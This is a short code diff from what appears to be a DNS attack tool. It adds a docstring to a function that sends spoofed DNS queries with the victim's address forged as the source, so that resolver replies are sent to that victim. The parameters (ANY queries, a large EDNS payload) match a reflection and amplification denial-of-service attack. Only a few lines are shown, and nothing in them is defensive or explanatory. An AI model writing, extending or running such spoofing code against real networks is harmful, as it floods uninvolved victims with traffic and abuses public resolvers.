@@ -38,6 +38,7 @@ def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                            victim_src_port=53, qtype='ANY', edns_payload=4096,
                            dnssec_do=False, txid=0x1337, id_random=False,
                            verbose=False, measure=False, qclass=1):
+    """Send one spoofed DNS query; resolver replies flow to victim_ip."""
     txid_val = _make_txid(txid, id_random)
     qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
     question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
